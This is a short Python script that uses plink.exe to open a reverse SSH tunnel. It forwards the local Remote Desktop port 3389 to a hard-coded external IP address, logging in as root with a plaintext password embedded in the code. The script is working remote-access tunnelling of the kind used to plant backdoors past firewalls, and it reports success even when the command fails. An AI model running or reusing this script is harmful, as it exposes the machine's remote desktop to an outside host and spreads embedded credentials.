import subprocess

def reverse_ssh(remote_host, remote_port, local_port, username, password):
    plink_path = r'C:\path\to\plink.exe'  # Replace with the actual path to plink.exe

    # Generate the command to establish the reverse SSH tunnel with username and password authentication
    command = [
        plink_path, '-ssh', '-l', username, '-pw', password,
        '-R', f'{remote_port}:localhost:{local_port}', remote_host
    ]

    try:
        subprocess.call(command)
        print('Reverse SSH tunnel established successfully.')
    except Exception as e:
        print(f"Error: {str(e)}")

# Example usage
reverse_ssh('66.42.49.122', 3387, 3389, 'root', 'fJ}2nWG$yV6ocyU$')
